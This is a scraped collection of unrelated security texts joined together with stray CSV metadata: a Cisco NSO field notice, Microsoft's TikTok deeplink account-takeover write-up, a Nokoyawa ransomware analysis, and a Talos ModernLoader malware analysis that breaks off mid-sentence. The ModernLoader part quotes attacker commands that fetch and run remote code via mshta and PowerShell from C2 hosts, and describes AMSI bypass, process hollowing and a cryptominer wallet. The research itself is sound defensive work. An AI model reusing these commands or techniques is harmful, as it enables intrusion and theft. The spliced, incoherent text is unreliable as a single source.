NSO is a multivendor system that links network automation and orchestration tools with the underlying physical and virtual infrastructure, with applications in enterprise and service provider environments. In a recent field notice , the networking giant discovered a process in the software that causes a resources leak and eventual crash – and the time between crashes depends only on the resources allocated to the software. It affects twenty versions of NSO 5, from 5.6 to 5.8.2. The problem is that an API called cbd-diff-iterate is available to subscribers, but also used internally by Cisco for licensing and notification purposes. “This affects customers who use Smart Licensing, use notification-kicker, or directly call the API through C, Python, Java, or econfd. “Any change under /kickers/notification-kicker or /devices/device will trigger an internal subscription, which leads to the leak”, Cisco’s field notice explained. The internal subscribers cannot be disabled. “Once enough transactions have been performed, the Cisco NSO process will get terminated due to exhausting all available resources … The number of transactions that can be performed before termination will depend on the resources allocated to Cisco NSO,” Cisco explained.

As with previous roundups, this post isn't meant to be an in-depth analysis. Instead, this post will summarize the threats we've observed by highlighting key behavioral characteristics, indicators of compromise, and discussing how our customers are automatically protected from these threats. As a reminder, the information provided for the following threats in this post is non-exhaustive and current as of the date of publication. Additionally, please keep in mind that IOC searching is only one part of threat hunting. Spotting a single IOC does not necessarily indicate maliciousness. Detection and coverage for the following threats is subject to updates, pending additional threat or vulnerability analysis. For the most current information, please refer to your Firepower Management Center, Snort.org , or ClamAV.net . For each threat described below, this blog post only lists 25 of the associated file hashes and up to 25 IOCs for each category. An accompanying JSON file can be found here that includes the complete list of file hashes, as well as all other IOCs from this post. A visual depiction of the MITRE ATT&CK techniques associated with each threat is also shown. In these images, the brightness of the technique indicates how prevalent it is across all threat files where dynamic analysis was conducted. There are five distinct shades that are used, with the darkest indicating that no files exhibited technique behavior and the brightest indicating that technique behavior was observed from 75 percent or more of the files.

TikTok has advised users to update their app to Version 23.7.3 or above. The bug is described with utmost brevity in its Common Vulnerabilities and Exposures entry. “The TikTok application before 23.7.3 for Android allows account takeover. A crafted URL (unvalidated deeplink) can force the com.zhiliaoapp.musically WebView to load an arbitrary website. This may allow an attacker to leverage an attached JavaScript interface for the takeover with one click.” In a blog post describing its discovery, Microsoft offered more detail. “The vulnerability allowed the app’s deeplink verification to be bypassed,"" Microsoft wrote. ""Attackers could force the app to load an arbitrary URL to the app’s WebView, allowing the URL to then access the WebView’s attached JavaScript bridges and grant functionality to attackers.” The post explained that JavaScript interfaces are provided by the WebView component, which “allows applications to load and display web pages and, using the addJavascriptInterface API call, can also provide bridge functionality that allows JavaScript code in the web page to invoke specific Java methods of a particular class in the app.” The account takeover bug was found in how the TikTok app handled a particular deeplink – a kind of hyperlink that links to a specific component within the mobile app. By abusing the way WebView and JavaScript interact with the apps’ deeplinks, Microsoft found an attacker could perform actions like retrieving the user’s authentication tokens; or retrieve or modify account data. “In short, by controlling any of the methods able to perform authenticated HTTP requests, a malicious actor could have compromised a TikTok user account,"" the researchers said.","['microsoft', 'security', 'tiktok', 'vulnerability']",e8b98226-0c49-504d-9bd0-fb2dbb1ad9e9," “The TikTok application before 23.7.3 for Android allows account takeover.

The vulnerability, which would have required several issues to be chained together to exploit, has been fixed and we did not locate any evidence of in-the-wild exploitation. Attackers could have leveraged the vulnerability to hijack an account without users’ awareness if a targeted user simply clicked a specially crafted link. Attackers could have then accessed and modified users’ TikTok profiles and sensitive information, such as by publicizing private videos, sending messages, and uploading videos on behalf of users. The vulnerability allowed the app’s deeplink verification to be bypassed. Attackers could force the app to load an arbitrary URL to the app’s WebView, allowing the URL to then access the WebView’s attached JavaScript bridges and grant functionality to attackers. We’ve previously researched JavaScript bridges for their potential wide-reaching implications. Emphasizing the importance of exercising caution when clicking unknown links, this research also displays how collaboration within the security community is necessary to improve defenses for the overall digital ecosystem. TikTok has two flavors of its Android app: one for East and Southeast Asia under the package name com.ss.android.ugc.trill , and another for the remaining countries under the package name com.zhiliaoapp.musically . Performing a vulnerability assessment of TikTok, we determined that the issues were affecting both flavors of the app for Android, which have over 1.5 billion installations combined via the Google Play Store. After carefully reviewing the implications, a Microsoft security researcher notified TikTok of the issues in February 2022, as part of our responsible disclosure policy through Coordinated Vulnerability Disclosure (CVD) via Microsoft Security Vulnerability Research (MSVR). TikTok quickly responded by releasing a fix to address the reported vulnerability, now identified as CVE-2022-28799 , and users can refer to the CVE entry for more information. We commend the efficient and professional resolution from the TikTok security team. TikTok users are encouraged to ensure they’re using the latest version of the app. In this blog post, we share information on the issues we discovered, examine how they could have been leveraged in an attack to quickly and quietly take over targeted users’ accounts, and walk-through best practices and protections. As threats across platforms continue to grow, we also share details of our research, disclosure, and collaboration with the larger security community in the effort to continually improve security for all, regardless of the platform or device in use. JavaScript interfaces Exploitation of the vulnerability relies on the app’s implementation of JavaScript interfaces, which are provided by a component of the Android operating system called WebView. WebView allows applications to load and display web pages and, using the addJavascriptInterface API call, can also provide bridge functionality that allows JavaScript code in the web page to invoke specific Java methods of a particular class in the app. Loading untrusted web content to WebView with application-level objects accessible via JavaScript code renders the application vulnerable to JavaScript interface injection, which may lead to data leakage, data corruption, or, in some cases, arbitrary code execution. In our example, the code below demonstrates how a JavaScript interface is used, an instance of the JsObject class is injected into WebView (line 8) and it is referenced by the injectObject variable within the JavaScript code, which is loaded via the loadUrl API method (line 10): Figure 1. Adding a JavaScript interface to a WebView object Prior to Android API level 18 (released in 2013 with Android 4.3), any method of the injected class was exposed to this JavaScript code. From API level 18 onwards, only class methods with the “@JavascriptInterface” annotation can be invoked (depicted above in line 2). JavaScript bridge TikTok for Android uses JavaScript interfaces extensively, enhancing WebView capabilities that are used within the app. We identified a class of interest that makes use of such a WebView. It registers a JavaScript bridge that has access to every type of functionality implemented by the classes of the [redacted ] .bridge.* package. This bridge exposes the method depicted below: Figure 2. Rendering the method callable via the JavaScript code The arg1 corresponds to a JSON string that consists of several attributes, with the func and params attributes as the most relevant. The func attribute corresponds to the name of the Java method that is invoked from the JavaScript code, while the params attribute sets arguments that this method takes. For example, to call the Java method with signature String foo(String arg1, String arg2) from the JavaScript code, the following statement must be used: Figure 3. Example code invoking a Java method via the JavaScript interface. The result is returned as a JSON string to a callback defined in the JavaScript code, which takes a single string as an argument. Figure 4. Interaction between Java and web components using the JavaScript interface The above figure visualizes the concept and depicts the following steps: The application loads the website example.com to its WebView The JavaScript code, which is fetched from the remote server, invokes the Java method The method is executed The result is returned as a parameter to the callback function Finally, the handler method can process the result locally or send it to an external server using an XMLHttpRequest , a built-in browser object that can also be leveraged during an attack to send stolen data to an attacker’s server. Diving into deeplinks The vulnerability itself was ultimately found to reside in the app’s handling of a particular deeplink. In the context of the Android operating system, a deeplink is a special hyperlink that links to a specific component within a mobile app and consists of a scheme and (usually) a host part. When a deeplink is clicked, the Android package manager queries all the installed applications to see which one can handle the deeplink and then routes it to the component declared as its handler. A deeplink must be declared in the application’s manifest to be used by components outside of the application’s context: Figure 5. An example of adding an intent filter in the app’s manifest for deep linking. In the example above in Figure 5, The user clicks the link http://www.example[.]com/gizmos . Since more than one application can handle the scheme, the system then presents a dialog box, also known as ambiguity dialog, similar to the one depicted below in Figure 6. A deeplink in the form of example://gizmos is routed directly to the activity GizmosActivity , the component declared as the deeplink handler in this case. Figure 6. Ambiguity dialog To avoid the ambiguity dialog for http and https schemes, an application may declare an Android App Link by using the autoVerify attribute in its intent filter to signal the system to verify the association between the app and the declared URL domain. Additionally, a JSON file that contains the application’s package name and its certificate’s SHA256 fingerprint must be published under https://domain.name/.well-known/directory. TikTok for Android uses this feature for the domain m.tiktok.com , meaning all the links matching to the specific domain will be routed to the application without presenting the ambiguity dialog. Besides deeplinks that are exported in the Android manifest, an application can also exchange data between its components using internal deeplinks. Trying to open an internal deeplink from outside the application, like in a web browser, will return an “unable to resolve Intent” error message as the system can’t route it to the appropriate handler. Vulnerability findings It’s important to understand the various components at play that allow the vulnerability to be exploited, such as the app’s implementation of JavaScript interfaces, since they determine the impact of the vulnerability itself. While reviewing the app’s handling of a specific deeplink, we discovered several issues that, when chained together, could have been used to force the application to load an arbitrary URL to the application’s WebView. By crafting this URL with additional query parameters, it was possible to inject an instance of the JavaScript bridge that provides full access to the functionality implemented by the [redacted] .bridge.* package. What follows is a technical description of the vulnerability, which we analyzed using the TikTok Android application with the package name com.zhiliaoapp.musically . The same description applies for the TikTok Android application com.ss.android.ugc.trill , as the vulnerabilities were found in common SDKs. Triggering the app’s internal deeplinks TikTok for Android uses multiple deeplink schemes, some of which are exported via the manifest, while some are used only internally by the application. Among the exported ones, the https://m.tiktok[.]com/redirect link is handled by the [redacted] class and is used to redirect URIs to various components of the application via a query parameter: Figure 7. Identifying deeplinks and their targeted activities using Medusa We determined that it’s possible to trigger internal deeplinks via the query parameter and call non-exported activities, expanding the attack surface of the application. According to TikTok, this redirection to internal deeplinks doesn’t raise any additional concerns. As a proof of concept, we crafted a URL that uses a particular non-exported scheme to load https://www.tiktok[.]com to the application’s WebView, as displayed below in Figure 8: Figure 8. Using a link to trigger an internally used scheme and load Tiktok.com. Although the [redacted-internal-scheme] ://webview?url=<website> deeplink can be used to load URLs to the CrossPlatformActivity’s WebView via a query parameter, the application imposes filters to reject untrusted hosts. In contrast to the Tiktok.com domain successfully loading, as shown in Figure 8 above, Figure 9 below displays the domain Example.com being rejected by the application filters: Figure 9. The application’s filters rejecting the [redacted-internal-scheme] ://webview?url=https://www.example[.]com deeplink The filtering takes place on the server-side and the decision to load or reject a URL is based on the reply received from a particular HTTP GET request. Our static analysis indicated that it is possible to bypass the server-side check by adding two additional parameters to the deeplink. The WebView attached to the activity creates instances of the JavaScript bridge, which we verified dynamically using Medusa’s WebView module. From this point on, the website assigned to the query parameter of the [redacted-scheme] ://webview scheme has full access to the JavaScript bridge, meaning the website’s JavaScript code can now access and invoke any exposed functionality found under the [redacted] .bridge.* package. Exposed functionality Reviewing the functionality accessible to the JavaScript code in web pages loaded to WebView, we identified more than 70 exposed methods. When paired with an exploit to hijack WebView, such as the vulnerability we discovered, these methods can be invoked to grant functionality to attackers. Some of the exposed methods can access or modify users’ private information, while others can perform authenticated HTTP requests to any URL given as a parameter. Moreover, the method accepts a set of parameters in the form of a JSON string that can be used to form the body of a POST request and returns the server’s reply, including the headers. By invoking such methods, an attacker can: Retrieve the user’s authentication tokens by triggering a request to a controlled server and logging the cookie and the request headers. Retrieve or modify the user’s TikTok account data, such as private videos and profile settings, by triggering a request to a TikTok endpoint and retrieving the reply via the JavaScript callback. In short, by controlling any of the methods able to perform authenticated HTTP requests, a malicious actor could have compromised a TikTok user account. Proof of concept In the following proof of concept, the attacker sends a crafted link to a targeted TikTok user. Once the user clicks the link, the video uploading authentication tokens are sent back to the attacker and, subsequently, the script modifies the user’s biography information to read “!! SECURITY BREACH !!”: Once the attacker’s specially crafted malicious link is clicked by the targeted TikTok user, the attacker’s server, https://www.attacker[.]com/poc, is granted full access to the JavaScript bridge and can invoke any exposed functionality. The attacker’s server returns an HTML page containing JavaScript code to send video upload tokens back to the attacker as well as change the user’s profile biography. The video uploading authentication tokens are sent back to the attacker via an XMLHttpRequest . The attacker also receives the reply body and the header, depicted in Figure 10 and 11 below: Figure 10. The request headers retrieved by the attack Figure 11. The server’s reply including the headers Finally, the message “!! SECURITY BREACH !!!” is set in the user profile’s biography: Figure 12. Compromising the user’s profile integrity JavaScript interface best practices As this case and our prior research has shown, from a programming perspective, using JavaScript interfaces poses significant risks. A compromised JavaScript interface can potentially allow attackers to execute code using the application’s ID and privileges. Thus, we recommend that the developer community be aware of the risks and take extra precautions to secure WebView. In cases where using JavaScript interfaces cannot be avoided, we suggest using an approved list of trusted domains to be loaded to the application’s WebView to prevent loading malicious or untrusted web content. Additionally, we suggest the following secure coding practices: Use the default browser to open URLs that don’t belong to the application’s approved list. Keep the approved list up to date and track the expiration dates of the included domains. This can prevent attackers from hijacking WebView by claiming an expired domain on the approved list. Avoid using partial string comparison methods to compare and verify a URL with the approved list of trusted domains. Avoid adding stage or internal network domains to the approved list as these domains could be spoofed by an attacker to hijack WebView. Responsible disclosure and industry collaboration improves security for all Leveraging new threats, techniques, and attacker capabilities, adversaries continue to focus on identifying and taking advantage of unpatched vulnerabilities and misconfigurations as a vector to access systems and sensitive information for malicious purposes. Responding to the changing threat landscape requires us to expand our knowledge and expertise into other devices and platforms as part of our commitment to continuously improve security from Microsoft, not just for Microsoft. We use collaborative research such as this to improve our protection technologies across platforms, ensuring Microsoft Defender Vulnerability Management detects and alerts on installed applications with known vulnerabilities—including those affecting non-Windows devices. While we’re not aware of any active exploitation of this vulnerability in the wild, users can further follow the security guidelines below to defend against this and similar types of issues: Avoid clicking links from untrusted sources Always keep the device and the installed applications updated Never install applications from untrusted sources Immediately report any strange application behavior to the vendor, such as setting changes triggered without user interaction. As part of our responsible disclosure policy through Coordinated Vulnerability Disclosure (CVD) via Microsoft Security Vulnerability Research (MSVR), we disclosed the vulnerability to TikTok in February 2022 as directed on its website . The vulnerability, CVE-2022-28799 , was quickly rated as high severity with a score of 8.3, and a fix for the issue was included in an updated version of the app released less than a month after the initial disclosure. We wish to thank the TikTok security team for collaborating quickly and efficiently in resolving these issues. This case displays how the ability to coordinate research and threat intelligence sharing via expert, cross-industry collaboration is necessary to effectively mitigate issues. As threats across platforms continue to grow in numbers and sophistication, vulnerability disclosures, coordinated response, and other forms of threat intelligence sharing are needed to help secure users’ computing experience, regardless of the platform or device in use. We will continue to work with the larger security community to share research and intelligence about threats in the effort to build better protection for all.

New variants are constantly detected, and existing threats keep adding new features and techniques for performing malicious operations . A notable example is Nokoyawa ransomware, a new variant possibly related to Hive and Babuk. Digging into the details of Nokoyawa At first glance, the Nokoyawa binary is not packed and protected by ransomware authors. As seen below, we can observe plain-text strings indicating some of the features of this ransomware. Figure 1: Strings of Nokoyawa ransomware not obfuscated. Nokoyawa command line options Nokoyawa has hardcoded several command line possibilities for customized executions, as shown in Figure 1, namely: -help: Print the list of available commands -network: Encrypt all local, network drives including network shares -file filePath: Encrypt a single file -dir dirPath: Encrypt selected folder and sub-folders If no argument is provided on the terminal execution, Nokoyawa encrypts all local drives and volumes by default. As highlighted below, if the variable “ v6 ” — the number of arguments from the command line — is not equal to 2, the ransomware passes the execution to the “sub_140003380()” function and starts the encryption process on all the available volumes. Figure 2: Nokoyawa encrypts all the volumes and drives by default if no argument is passed on the command line. Skipped files during the encryption process This ransomware takes advantage of multi-threading to encrypt files efficiently and quickly. Some files and extensions are skipped during the malware runtime. The folders are hashed (see list below), but the ignored file extensions are in clean-text: dll , exe and lnk . Also, files with NOKOYAWA in their names are excluded during the process. 0x11f299b5 program files 0x78fb3995 program files (x86) 0x7c80b426 appdata 0x7c8cc47c windows 0xc27bb715 programdata 0xd6f02889 $recycle.bin Figure 3: Folders skipped during Nokoyawa execution. Figure 4: File extensions ignore in runtime. Encryption process Nokoyawa uses the BCryptGenRandom( ) call from bcrypt.dll to generate 0x20 random bytes (seed), creating a fresh key-pair of elliptic-curve cryptography (ECC) – public and private keys. After that, the public key inside the malware and the pair generated in the previous step are used to generate a shared and symmetric SALSA20 key, which will be used to encrypt the target files. As shown below, the nonce used in SALSA20 is hardcoded: “ lvcelvce .” Figure 5: Beginning of the encryption process and the hardcoded nonce used in the SALSA20. The SHA1 hash of the generated key is appended to the end of each damaged file, along with the public key and the string NOKOYAWA. In addition, the public key in the encrypted file and the private key owned by the Nokoyama operators are necessary to generate the SALSA20 symmetric key for decrypting each damaged file. Below is a picture of the Nokoyawa decryptor. Figure 6: Nokoyawa decryptor. Ransomware note Each encrypted file has appended the .NOKOYAWA extension. The ransomware note called “ NOKOYAWA_readme.txt ” is also dropped into each folder with an English and Chinese version in the same file. Figure 7: Nokoyawa ransomware note. Ransomware prevention measures Ransomware is one of the most dangerous pieces of malware because it can compromise and leak sensitive data. It is costly and badly impacts the reputation of the affected brands. Because of this, a cybersecurity strategy to fight this threat is necessary. Although there is no perfect formula for stopping ransomware incidents, implementing monitoring procedures, using host-based security solutions such as antivirus and EDR and increasing the use of canary files are elementary instruments that could help you avoid damage from these threats in the wild.

635124e528e9d467ce4284b8,ciscotalos,https://blog.talosintelligence.com/2022/08/modernloader-delivers-multiple-stealers.html,"ModernLoader delivers multiple stealers, cryptominers and RATs",Vanja Svajcer,2022-08-30,"By Vanja Svajcer Cisco Talos recently observed three separate, but related, campaigns between March and June 2022 delivering a variety of threats, including the ModernLoader bot, RedLine information-stealer and cryptocurrency-mining malware to victims. The actors use PowerShell, .NET assemblies, and HTA and VBS files to spread across a targeted network, eventually dropping other pieces of malware, such as the SystemBC trojan and DCRAT, to enable various stages of their operations. The attackers' use of a variety of off-the-shelf tools makes it difficult to attribute this activity to a specific adversary. The final payload appears to be ModernLoader, which acts as a remote access trojan (RAT) by collecting system information and deploying various modules. In the earlier campaigns from March, we also observed the attackers delivering the cryptocurrency mining malware XMRig. The March campaigns appeared to be targeting Eastern European users, as the constructor utility we analyzed had predefined script templates written in Bulgarian, Polish, Hungarian and Russian. The actors are attempting to compromise vulnerable web applications to serve malware and deliver threats via files masquerading as fake Amazon gift cards. Technical details Initial findings In June 2022, Cisco Talos identified an unusual command line execution in our telemetry. The decoded base64 command is below: Initial finding: A command executed on the system. The 31.41.244[.]231 IP is a Russian IP and hosts several other URLs with similar naming conventions. Autostart command Following the discovery of the initial command, we identified two other command lines. They are a result of an autorun registered executable and the execution of a scheduled task. The autorun executable and scheduled task command lines. The first command connects to the download server and downloads an HTA application whose script is obfuscated with HTML Guardian, an application that encrypts HTML code. The content displayed when the HTA file is opened in a browser. When deobfuscated, the HTA file executes the VB script code to download and run PowerShell code from hxxp[:]//31[.]41[.]244[.]231/0x?0=Loader, which launches the next stage of the loading process. Deobfuscated HTA code. The autorunnn.exe module (d9c8e82c42e489ac7a484cb98fed40980d63952be9a88ff9538fc23f7d4eb27f) is a modified variant of the SharpHide open-source utility, which attempts to create a hidden registry entry. It uses NtSetValueKey native API to create a hidden (null-terminated) registry key by adding a null byte in front of the UNICODE_STRING key valuename. In our case, SharpHide is modified to create the following entry: \HKLM|HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\shell set to run the command: ""explorer.exe, cmd /c mshta hxxp://go[.]clss[.]cl/0k#=GoogleWindowsAnalyticsConfiguration"". The program also attempts to create a scheduled task which runs when the user logs onto the system. The task name is ""OneDrive Standalone Update Task"" and it will attempt to execute the sams command to download and run the PowerShell loader: ""mshta hxxp[:]//go[.]clss[.]cl/0k#=GoogleWindowsAnalyticsConfiguration"". Modified SharpHide code is used to hide registry startup entry. The URL serves PowerShell code which will be executed on the system. As part of the logon sequence, the system executes a file, which ensures that the registry entry and the scheduled task set to download the next stage are set. PowerShell loader The next stage is the PowerShell loader. The loader contains embedded code of three modules, which are loaded using reflection as additional .NET assemblies into the PowerShell process space. The downloaded PowerShell code also downloads and runs auxiliary modules and payloads. There are usually three modules in this loader format. The first disables AMSI scanning functionality, the second is the final payload, and the last injects the payload into the process space of a newly created process, usually RegSvcs.exe. KillAMSI Killamsi.dll is stored as a base64-encoded string split between the first two encoded characters and the rest of the encoded assembly DLL. The DLL contains obfuscated code, which attempts to patch Microsoft's AMSI interface (amsi.dll) AmsiScanBuffer function with the code to return an error value. This may prevent antimalware engines to scan executed PowerShell code and allow the attacker to bypass the detection of the next stages of the loader execution. Amsi.dll is decoded, loaded and its Main function called. Process injector The last module in the loader file is ""friday.dll."" It is obfuscated with multiple layers of obfuscation, such as ConfuserEx and Dotnet reactor. It creates a new process and places the next injector stage into the newly created RegSvcs.exe process. Friday.dll module is used to inject the next injection stage into RegSvcs.exe process. The second-stage injector is an assembly: Managament.inf. It creates an instance of svchost.exe process and injects code using process-hollowing to load the final payload stored in the initial PowerShell loader script. The injector creates a svchost.exe process in suspended mode and then allocates virtual memory for the injection of the payload module. The original svchost module is unmapped by calling the ZwUnmapViewOfSection. This is followed by the fairly common injection sequence of API calls to get thread context, copy the data from the payload to the allocated virtual memory, set the thread context to point to the payload entry point and, finally, to resume the suspended thread. Depending on the bitness of the operating system, the appropriate functions are used for getting and setting the thread contexts of the 32 bit process from the 64 bit operating system. The injected payload is Client.exe (3f5856a9ec23f6daf20fe9e42e56da1b8dcb0de66b6628a92b554d6e17c02fc3), a ModernLoader instance. ModernLoader bot (aka Avatar bot) The payload for the initial loader URL is a simple .NET remote access trojan, ModernLoader. ModernLoader has been in use since at least 2019, and some researchers are referring to it as ""Avatar bot,"" although it has nothing in common with the rootkit documented in 2013 using the same name. ModernLoader's constructor initializes the bot with a hardcoded C2 URL. Once the bot is initialized, it collects the following information about the system and send the information to the C2 server using the HTTP Post request to hxxp[:]//31[.]41[.]244[.]231/AVAVA/gate[.]php: Win32_ComputerSystemProduct UUID (using WMI to query the configuration data). GPU details from Win32_DisplayConfiguration. The AD or the workgroup name. The external IP address by reading the response from http://ipinfo.io/ip. The IP address country by reading the response from http://ipinfo.io/country. The Windows operating system version information. The amount of RAM. The processor architecture and type. The user privileges (admin or user). Anti malware products installed on the affected system. The amount of space left. The bot version. The name of the computers on the network (through querying local ActiveDirectory data). The presence of an RDP module on the disk (used as auxiliary payload for the bot). Once the initial data is sent, ModerLoader reads the response to find tasks returned from the servers using the JSON format. ModernLoader executes tasks using the function DoTask. DoTask accepts very few commands and can either execute a command line or download and execute a file. This limited functionality might have prompted the author to call this bot a loader, but for all intents and purposes, it is just a simple remote access trojan (RAT). The advantage of using a loader such as ModernLoader is that the actor can change the campaigns and deploy different modules in real time. The way the modules are deployed, the payloads often exist only in RAM and not on the hard drive as files. Of course, this approach has a major weakness because it relies on a single IP address, which means the campaign is terminated as soon as the C2 server is offline. ModernLoader runs in an endless loop periodically contacting the C2 server for new tasks until the process is terminated. ModernLoader is a staple of the campaigns we analyzed. Its main purpose is to download and execute additional payloads and modules, as instructed by the C2 server. Based on our telemetry data and the open-source intelligence, there are more than 10 additional modules hosted on the C2, but not all of them were available for download at the time of writing this post. Earlier campaigns During the investigation, we discovered two earlier campaigns from March 2022 that are closely related to the campaign using 31[.]41[.]244[.]231 as the C2 server. Both campaigns use similar TTPs, with ModerLoader as the main bot that communicates with the C2 server and additional modules served by C2 servers with IP addresses: 62[.]204[.]41[.]192 and 62[.]204[.]41[.]71 There are a few clues that confirm the relationship between these campaigns. The first is the task given to one of the infected systems using 62[.]204[.]41[.]71 as the C2 server. We first see the connection of the infected system to the C2 server and then the task to execute a PowerShell command to download and execute a module from 62[.]204[.]41[.]192, the C2 server used in another campaign. Connecting two C2 servers in a C2 task assigned to the ModernLoader. The link between 31[.]41[.]244[.]231 and 62[.]204[.]41[.]71 is found in a downloader, which is a part of the set of standalone downloaders linked with these campaigns. They usually have the name offer.exe and are written in Visual Basic 6. These downloaders provide the second infection vector. The downloader that proves the second link is 27bb9ee41bc7745854e3f3687955f1a6df3bbd74a7d1050a68fe0d0e6087b4b3, which purports to be an update for the Brave web browser. The sample contains the code to launch PowerShell commands to download and run the code from: hxxp[://]31[.]41[.]244[.]2311/AVAVA/WAW/Documents/go[.]oo hxxp[://]31[.]41[.]244[.]2311/AVAVA/WAW/APPDATA/go[.]oo hxxp[://]62[.]204[.]41[.]71/Offer/Offer[.]oo Although the original IP address here is mistyped, the similarity to the newest C2 IP address is strong enough to link these campaigns. Droppers (vs_community.exe theme) The internal name of many droppers is vs_community.exe that is likely done to convince users that the files are part of the Visual Studio community edition. Most of the droppers are created with the 7-Zip SFX Constructor tool and the version information strings are likely kept the same for all of the dropper files created in the campaign. Payload modules received from the C2 server No.go hxxp:[//]31[.]41[.]244[.]231/0xNANA/no[.]go is the first URL we discovered when investigating anomalous daily PowerShell invocations. Like the Loader module, it consists of the amsi.dll module with the ability to disable the AMSI interface, the payload to be loaded into RegSvcs.exe and the payload injector module friday.dll. Since we already know how the process injection is implemented, we can focus on the payload. The payload is auto.exe, 142c333bef9eab4ce9d324e177572423c845ee399c01b4b78cfff730b4cb79b4 and another downloading stage. The stage creates a randomly named VB script and a randomly named installation information .inf file, which is opened using cmstp.exe (Connection Manager Profile Installer). The .inf file instructs the system to launch the VB script. This somewhat convoluted execution of VB script is a likely attempt to circumvent the Windows User Account Control (UAC). The VB script is very similar to other VB scripts in the campaign and it simply attempts to download and execute PowerShell code from two URLs hosted on the C2 server. A randomly named VBS file is stored in the resource section of the auto.exe module. Unfortunately, at the time of the analysis, but it also seems during the observed attack, the two modules DEKL.go and ya.go were not accessible. Nevertheless, the observed attack chain continues with the request to download and execute the next module, which is Nana.go, from hxxp[://]31[.]41[.]244[.]231/0xNANA/file/NANA[.]go. VB scripts employed in these campaigns contain the text that also exists in Emotet macro downloaders. It is not clear if they are an artifact of a code generator or they are taken from another source to make the detection of the script more difficult by randomizing some of the content. Although the comments contain grammatically correct sentences, they have very little meaning and may have been generated by something akin to the Markov Chain sentence generator. Nana.go During the observed attack, the Nana.go module is downloaded and executed with the filename 0xNax.exe. The module checksum is 4621924ff1b05ad7c15bc4b5dad68f7c8c3eceaf7824444b149264eff79d4b9a and is packed with UPX. The internal file version string name for this file indicates that it may be a Microsoft Visual Studio community installer. The vs_community.exe theme appears in the multiple files of the campaign. The name indicates that it may be spread on file sharing websites and P2P networks. The dropped file names in the campaign seem to be chosen to appear as legitimate Windows utilities. Once unpacked, the module is a self-extracting 7-Zip file created with the 7-Zip SFX Constructor utility. The utility allows the user to add multiple files from a single folder to the 7-Zip archive with a stub that interprets a configuration data stored encrypted within the self-extracting file. The configuration data contains various instructions to the extractor stub, similar to a scripting engine. The scripting engine allows the user to specify where the file will be extracted and which commands should be run during the extraction process. The Constructor utility seems to be targeted to Eastern European users with predefined script templates in Bulgarian, Polish, Hungarian and Russian. 7-Zip SFX Constructor script editor. The 7-Zip SFX files are used throughout the campaign and nana.go is just one of them. When executed, it will drop and launch two additional modules - C:\Users\<Username>\AppData\Roaming\Log\AppData.exe, 7e73bc53cd4e540e1d492e6fd8ff630354cd8a78134e99bc0b252eccb559c97a and C:\Users\<Username>\AppData\Roaming\Log\OneDrive.exe, eb37c756c60a75068bfe88addd24e209080fe5383d25c919ea40fe78fff98612. AppData.exe is another self-extracting 7-Zip file with the internal filename vs_community.exe. When executed, it drops and runs the following files: C:\Users\<Username>\AppData\Roaming\WinServer\Log.exe (3f2f84147c55e5fc42261ace15ad55239d0bcba31a9acd20b99c999efbb9d392) C:\Users\<Username>\AppData\Roaming\WinServer\AppData.exe ( d9c8e82c42e489ac7a484cb98fed40980d63952be9a88ff9538fc23f7d4eb27f) The appdata.exe in the WinServer folder is identical to the already mentioned AUTORUNNN.exe, which sets the registry key to launch the infection process when the user logs into the system. The module Log.exe drops and runs additional files: C:\Users\<Username>\AppData\Roaming\UpdatersHelper\UpdatersHelper.exe (852857c66ee72f264c26d69c1f4092e99c2ed1fdcfef875f982fb75ed620ccc0). Internally the module name is BypassDefender. This seems to be a variant of the BypassDefender project whose source code is available on GitHub and the purpose is to disable Windows defender by stopping its service and the associated processes. C:\Users\<Username>\AppData\Roaming\UpdatersHelper\UpdatersHelper.bat (435aa8b19125d795ada322aa8e30f3dd9afa03a4ac1350177c920426d1b17a47). This is a batch file that sets a scheduled job to run the UpdatersHelper.exe executable module and sets its attributes to the system and hidden so that it is not displayed in the default Windows Explorer view OneDrive module is an injector that injects a .NET loader into the process space of conhost.exe. The injected shellcode sets up the process for the next injection stage, which is a .NET assembly that drops and loads additional modules and starts a copy of XMRig to mine Monero using a pool on pool.hashvault.pro using the pool address 44Ds8fbC3HWQCcwQotgrNDUWnmDixpQPG7YLh5h2rzSMQrxCRXeSjQvH8LRPNGSyqvXcKeEk3umZ7T2wzFAgovF15UckBxg. Xmrig's connection to a cryptomining pool. Based on the observed traffic in the Hashvault dashboard, it seems that the number of infected systems using this particular pool is in the low hundreds, with relatively low mining yield. Looking at the geography, most of the connections are coming from Indonesia and other Asian countries, along with Eastern Europe. OneDrive.exe miner pool hash rate in second half of June. Before executing the miner, the loader will attempt to load a watchdog process as well as the kernel driver that allows the writing of memory in kernel mode. The watchdog process, sihost64.exe, ensures that the miner is restored if the miner file is deleted and its process is restarted if terminated. Several other commands exist that could disable Windows and Windows Defender. Miner loader attempts to disable Windows update. A scheduled task GoogleUpdateTaskMachineQC runs every time the user logs onto the system and launches the OneDrive.exe miner from C:\Users\<Users>\AppData\Roaming\OneDrive\OneDrive.exe. The initial stub and the shellcode of the file is very similar to miners generated with a version of Silent Crypto Miner generator and the structure of the miner loader is also consistent with the loaders generated by the Silent Crypto Miner and SilentXMR projects. Decompiled miner loader code. Silent Crypto Miner loader source code. Silent Crypto Miner is a generator that allows users with little knowledge of programming to create effective and resilient miner loaders. Silent cryptocurrency miner builder form. Meta, ww.cc and RegAsm.go The PowerShell meta module is a loader that uses the similar three-assembly scheme to inject the payload beachy.exe into the process space of a newly created RegSvcs.exe process. Beachy.exe (b71c43bf7af23ed6a12bdb7ce96a4755b8a7f285b8aa802484e8b2dfa191f14e) is an obfuscated instance of the RedLine stealer using encrypted strings and legitimate class and function names to connect to the IP address 31[.]41[.]244[.]235:45692 as the C2 server. Standard RedLine stealer authorization disguised as legitimate software. RedLine URL module Contrary to the URL name that serves this module, hxxp[://]31[.]41[.]244[.]231/0x/?0=RedLine, this module does not inject a variant of the RedLine stealer, but a variant of the ModernLoader bot (53b09a7c8bf41ed9015b8e3a98fb8b8581e82d17c1ead0bd0293f2e3e9996519). As is the case with the original Loader module, the RedLine PowerShell script creates a new RegSvcs.exe hollowed process that launches the next stage of the injector that eventually moves the ModernLoader assembly client.exe into a newly created and hollowed svchost.exe process. This connects to the latest ModernLoader C2 script at hxxp[://]31[.]41[.]244[.]231/AVAVA/gate[.]php. The RedLine module is usually downloaded by any of the standalone offer.exe executables (dc5255a5bcc89266ea0c7ca79f7a52ab281cbb6cc1980ee5b3a818114c01b93c), which also eventually downloads other modules to be executed: hxxp[://]31[.]41[.]244[.]231/0xMine/RegAsm[.]go hxxp[://]31[.]41[.]244[.]231/0xSocks/go[.]go - a simple 